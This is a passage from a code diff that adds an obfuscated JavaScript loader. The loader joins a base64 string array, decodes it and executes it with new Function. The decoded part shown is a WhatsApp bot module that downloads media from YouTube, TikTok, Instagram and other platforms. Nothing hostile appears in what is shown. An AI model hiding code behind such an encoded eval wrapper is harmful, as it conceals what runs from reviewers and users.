+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKLy8g4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCgpmdW5jdGlvbiBkZXRlY3RQbGF0Zm9y",
+    "bSh1cmwpIHsKICBpZiAoL3lvdXR1XC5iZXx5b3V0dWJlXC5jb20vLnRlc3QodXJsKSkgICAgIHJldHVy",
+    "biAneW91dHViZSc7CiAgaWYgKC90aWt0b2tcLmNvbXx2bVwudGlrdG9rfHZ0XC50aWt0b2svLnRlc3Qo",
+    "dXJsKSkgcmV0dXJuICd0aWt0b2snOwogIGlmICgvaW5zdGFncmFtXC5jb20vLnRlc3QodXJsKSkgICAg",
+    "ICAgICAgICAgcmV0dXJuICdpbnN0YWdyYW0nOwogIGlmICgvZmFjZWJvb2tcLmNvbXxmYlwud2F0Y2h8",
+    "ZmJcLmNvbS8udGVzdCh1cmwpKSByZXR1cm4gJ2ZhY2Vib29rJzsKICBpZiAoL3R3aXR0ZXJcLmNvbXx4",
+    "XC5jb20vLnRlc3QodXJsKSkgICAgICAgIHJldHVybiAndHdpdHRlcic7CiAgaWYgKC9zb3VuZGNsb3Vk",
+    "XC5jb20vLnRlc3QodXJsKSkgICAgICAgICAgICByZXR1cm4gJ3NvdW5kY2xvdWQnOwogIHJldHVybiAn",
+    "dW5rbm93bic7Cn0KCi8qKgogKiBNYXN0ZXIgZG93bmxvYWQgZnVuY3Rpb24g4oCUIGF1dG8tZGV0ZWN0",
+    "cyBwbGF0Zm9ybSBhbmQgdXNlcyBmcmVlIEFQSXMKICogQHBhcmFtIHtvYmplY3R9ICBzb2NrICAgICAg",
+    "IC0gV2hhdHNBcHAgc29ja2V0CiAqIEBwYXJhbSB7c3RyaW5nfSAgamlkICAgICAgICAtIENoYXQgSklE",
+    "CiAqIEBwYXJhbSB7c3RyaW5nfSAgdXJsICAgICAgICAtIE1lZGlhIFVSTAogKiBAcGFyYW0ge29iamVj",
+    "dH0gIG9wdHMgICAgICAgLSB7IGF1ZGlvT25seSwgcXVvdGVkTXNnIH0KICovCmFzeW5jIGZ1bmN0aW9u",
+    "IGZyZWVEb3dubG9hZChzb2NrLCBqaWQsIHVybCwgb3B0cyA9IHt9KSB7CiAgY29uc3QgeyBhdWRpb09u",
+    "bHkgPSBmYWxzZSwgcXVvdGVkTXNnID0gbnVsbCB9ID0gb3B0czsKICBjb25zdCBwbGF0Zm9ybSA9IGRl",
+    "dGVjdFBsYXRmb3JtKHVybCk7CgogIHRyeSB7CiAgICBsZXQgZGxVcmwgPSBudWxsOwogICAgbGV0IG1l",
+    "dGEgID0gbnVsbDsKICAgIGxldCBleHQgICA9IGF1ZGlvT25seSA/ICdtcDMnIDogJ21wNCc7CgogICAg",
+    "aWYgKHBsYXRmb3JtID09PSAneW91dHViZScpIHsKICAgICAgbWV0YSAgPSBhd2FpdCBnZXRZVE1ldGEo",
+    "dXJsKTsKICAgICAgaWYgKG1ldGEpIGF3YWl0IHNlbmRJbmZvQ2FyZChzb2NrLCBqaWQsIG1ldGEsIGF1",
+    "ZGlvT25seSA/ICdhdWRpbycgOiAndmlkZW8nKTsKICAgICAgZGxVcmwgPSBhd2FpdCBkb3dubG9hZFlv",
+    "dVR1YmUodXJsLCBhdWRpb09ubHkpOwogICAgfSBlbHNlIGlmIChwbGF0Zm9ybSA9PT0gJ3Rpa3Rvaycp",
+    "IHsKICAgICAgbWV0YSAgPSBhd2FpdCBnZXRUaWtUb2tNZXRhKHVybCk7CiAgICAgIGlmIChtZXRhKSBh",
+    "d2FpdCBzZW5kSW5mb0NhcmQoc29jaywgamlkLCBtZXRhLCAndmlkZW8nKTsKICAgICAgZGxVcmwgPSBh",
+    "d2FpdCBkb3dubG9hZFRpa1Rvayh1cmwpOwogICAgICBleHQgICA9ICdtcDQnOwogICAgfSBlbHNlIGlm",
+    "IChwbGF0Zm9ybSA9PT0gJ2luc3RhZ3JhbScpIHsKICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShq",
+    "aWQsIHsgdGV4dDogJ/Cfk7ggX0ZldGNoaW5nIEluc3RhZ3JhbSBtZWRpYS4uLl8nIH0pOwogICAgICBk",
+    "bFVybCA9IGF3YWl0IGRvd25sb2FkSW5zdGFncmFtKHVybCk7CiAgICAgIGV4dCAgID0gZGxVcmwuaW5j",
+    "bHVkZXMoJy5qcGcnKSB8fCBkbFVybC5pbmNsdWRlcygnaW1hZ2UnKSA/ICdqcGcnIDogJ21wNCc7CiAg",
+    "ICB9IGVsc2UgaWYgKHBsYXRmb3JtID09PSAnZmFjZWJvb2snKSB7CiAgICAgIGF3YWl0IHNvY2suc2Vu",
+    "ZE1lc3NhZ2UoamlkLCB7IHRleHQ6ICfwn5OYIF9GZXRjaGluZyBGYWNlYm9vayB2aWRlby4uLl8nIH0p",
+    "OwogICAgICBkbFVybCA9IGF3YWl0IGRvd25sb2FkRmFjZWJvb2sodXJsKTsKICAgIH0gZWxzZSBpZiAo",
+    "cGxhdGZvcm0gPT09ICd0d2l0dGVyJykgewogICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwg",
+    "eyB0ZXh0OiAn8J+QpiBfRmV0Y2hpbmcgVHdpdHRlci9YIHZpZGVvLi4uXycgfSk7CiAgICAgIGRsVXJs",
+    "ID0gYXdhaXQgZG93bmxvYWRUd2l0dGVyKHVybCk7CiAgICB9IGVsc2UgewogICAgICAvLyBHZW5lcmlj",
+    "OiB0cnkgY29iYWx0IGZvciB1bmtub3duIHBsYXRmb3JtcwogICAgICBhd2FpdCBzb2NrLnNlbmRNZXNz",
+    "YWdlKGppZCwgeyB0ZXh0OiAn8J+MkCBfRmV0Y2hpbmcgbWVkaWEuLi5fJyB9KTsKICAgICAgZGxVcmwg",
+    "PSBhd2FpdCBjb2JhbHREb3dubG9hZCh1cmwsIGF1ZGlvT25seSk7CiAgICB9CgogICAgaWYgKCFkbFVy",
+    "bCkgdGhyb3cgbmV3IEVycm9yKCdObyBkb3dubG9hZCBsaW5rIG9idGFpbmVkJyk7CgogICAgYXdhaXQg",
+    "c29jay5zZW5kTWVzc2FnZShqaWQsIHsgdGV4dDogJ/Cfk6UgX0Rvd25sb2FkaW5nLi4uIHBsZWFzZSBo",
+    "b2xkIG9uIV8nIH0pOwogICAgY29uc3QgYnVmICAgID0gYXdhaXQgZG93bmxvYWRCdWZmZXIoZGxVcmws",
+    "IHVybCk7CiAgICBjb25zdCB0bXBGaWxlID0gc2F2ZVRtcChidWYsIGV4dCk7CiAgICBhd2FpdCBzZW5k",
+    "RmlsZShzb2NrLCBqaWQsIHRtcEZpbGUsICfinIUgKkRvd25sb2FkIENvbXBsZXRlISpcbl9Qb3dlcmVk",
+    "IGJ5IEFTVFJBLVhfIPCfjI0nLCBxdW90ZWRNc2cpOwogICAgcmV0dXJuIHRydWU7CgogIH0gY2F0Y2gg",
+    "KGUpIHsKICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7CiAgICAgIHRleHQ6CiAgICAgICAg",
+    "J+KdjCAqRG93bmxvYWQgZmFpbGVkKlxuXG4nICsKICAgICAgICAnXycgKyAoZS5tZXNzYWdlIHx8ICdV",
+    "bmtub3duIGVycm9yJykuc2xpY2UoMCwgMTgwKSArICdfXG5cbicgKwogICAgICAgICcqVGlwczoqXG4n",
+    "ICsKICAgICAgICAn4oCiIE1ha2Ugc3VyZSB0aGUgVVJMIGlzIHB1YmxpYyAobm90IHByaXZhdGUvcmVz",
+    "dHJpY3RlZClcbicgKwogICAgICAgICfigKIgVHJ5IGFnYWluIGluIGEgbWludXRlIOKAlCBzZXJ2ZXJz",
+    "IG1heSBiZSBidXN5XG4nICsKICAgICAgICAn4oCiIEZvciBZb3VUdWJlIGF1ZGlvLCB0cnk6ICouc29u",
+    "ZyA8dGl0bGU+KicsCiAgICB9KTsKICAgIHJldHVybiBmYWxzZTsKICB9Cn0KCi8vIOKUgOKUgCBZb3VU",
+    "dWJlIHNlYXJjaCArIGRvd25sb2FkIChmb3IgLnNvbmcgLyAucGxheSBjb21tYW5kcykg4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACgphc3luYyBmdW5jdGlvbiBz",
+    "ZWFyY2hBbmREb3dubG9hZChzb2NrLCBqaWQsIHF1ZXJ5LCBhdWRpb09ubHksIHF1b3RlZE1zZykgewog",
+    "IGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7IHRleHQ6IChhdWRpb09ubHkgPyAn8J+OtScgOiAn",
+    "8J+OrCcpICsgJyBfU2VhcmNoaW5nIGZvciAqJyArIHF1ZXJ5ICsgJyouLi5fJyB9KTsKCiAgLy8gVHJ5",
+    "IEludmlkaW91cyBzZWFyY2gKICBjb25zdCByZXN1bHQgPSBhd2FpdCB5dFNlYXJjaChxdWVyeSkuY2F0",
+    "Y2goKCkgPT4gbnVsbCk7CiAgaWYgKCFyZXN1bHQpIHsKICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2Uo",
+    "amlkLCB7IHRleHQ6ICfinYwgTm8gcmVzdWx0cyBmb3VuZCBmb3I6IConICsgcXVlcnkgKyAnKlxuVHJ5",
+    "IGEgZGlmZmVyZW50IHNlYXJjaCB0ZXJtLicgfSk7CiAgICByZXR1cm4gZmFsc2U7CiAgfQoKICAvLyBT",
+    "aG93IGluZm8gY2FyZAogIGNvbnN0IG1ldGEgPSB7CiAgICB0aXRsZTogICAgcmVzdWx0LnRpdGxlLAog",
+    "ICAgdXBsb2FkZXI6IHJlc3VsdC51cGxvYWRlciwKICAgIGR1cmF0aW9uOiByZXN1bHQuZHVyYXRpb24s",
+    "CiAgICB2aWV3czogICAgcmVzdWx0LnZpZXdzLAogICAgdGh1bWJuYWlsOiByZXN1bHQudGh1bWJuYWls",
+    "LAogICAgc291cmNlOiAgICdZb3VUdWJlJywKICB9OwogIGF3YWl0IHNlbmRJbmZvQ2FyZChzb2NrLCBq",
+    "aWQsIG1ldGEsIGF1ZGlvT25seSA/ICdhdWRpbycgOiAndmlkZW8nKTsKCiAgcmV0dXJuIGZyZWVEb3du",
+    "bG9hZChzb2NrLCBqaWQsIHJlc3VsdC51cmwsIHsgYXVkaW9Pbmx5LCBxdW90ZWRNc2cgfSk7Cn0KCm1v",
+    "ZHVsZS5leHBvcnRzID0gewogIGZyZWVEb3dubG9hZCwKICBzZWFyY2hBbmREb3dubG9hZCwKICBkb3du",
+    "bG9hZFlvdVR1YmUsCiAgZG93bmxvYWRUaWtUb2ssCiAgZG93bmxvYWRJbnN0YWdyYW0sCiAgZG93bmxv",
+    "YWRGYWNlYm9vaywKICBkb3dubG9hZFR3aXR0ZXIsCiAgc2VuZEZpbGUsCiAgZG93bmxvYWRCdWZmZXIs",
+    "CiAgc2F2ZVRtcCwKICB5dFNlYXJjaCwKICBzZW5kSW5mb0NhcmQsCiAgZGV0ZWN0UGxhdGZvcm0sCn07",
+    "Cg=="];
+var _0x3c4d=_0x1a2b.join('');
+var _0x5e6f=Buffer.from(_0x3c4d,'base64').toString('utf8');
+var _0x7a8b=new Function('require','module','exports','__filename','__dirname',_0x5e6f);
+_0x7a8b(require,module,exports,__filename,__dirname);
+})();
